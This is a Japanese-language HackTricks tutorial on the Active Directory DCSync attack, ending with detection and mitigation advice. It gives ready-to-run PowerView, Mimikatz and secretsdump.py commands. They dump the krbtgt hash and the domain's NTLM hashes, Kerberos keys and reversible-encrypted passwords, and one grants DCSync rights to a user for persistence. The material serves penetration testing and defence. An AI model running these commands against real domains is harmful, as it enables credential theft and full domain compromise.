# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 権限は、ドメイン自体に対して以下の権限を持つことを意味します: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** および **Replicating Directory Changes In Filtered Set**。

**DCSyncに関する重要な注意事項:**

- **DCSync攻撃は、ドメインコントローラーの動作をシミュレートし、他のドメインコントローラーに情報を複製するよう要求します**。これは、ディレクトリ複製サービスリモートプロトコル (MS-DRSR) を使用します。MS-DRSRはActive Directoryの有効かつ必要な機能であるため、オフにしたり無効にしたりすることはできません。
- デフォルトでは、**Domain Admins, Enterprise Admins, Administrators, および Domain Controllers** グループのみが必要な特権を持っています。
- もしアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。

### Enumeration

`powerview`を使用して、これらの権限を持つユーザーを確認します:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### ローカルでのエクスプロイト
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでのエクスプロイト
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` は3つのファイルを生成します：

- **NTLMハッシュ**を含むファイル
- **Kerberosキー**を含むファイル
- [**可逆暗号化**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効なアカウントのNTDSからの平文パスワードを含むファイル。可逆暗号化を持つユーザーを取得するには、次のコマンドを使用します。

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 永続性

ドメイン管理者であれば、`powerview`の助けを借りて、任意のユーザーにこの権限を付与できます：
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
次に、(「ObjectType」フィールド内に特権の名前が表示されるはずです) の出力で、ユーザーが3つの特権を正しく割り当てられているかどうかを**確認できます**:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – オブジェクトに対して操作が実行されました
- Security Event ID 5136 (Audit Policy for object must be enabled) – ディレクトリサービスオブジェクトが変更されました
- Security Event ID 4670 (Audit Policy for object must be enabled) – オブジェクトの権限が変更されました
- AD ACL Scanner - ACLの作成と比較レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
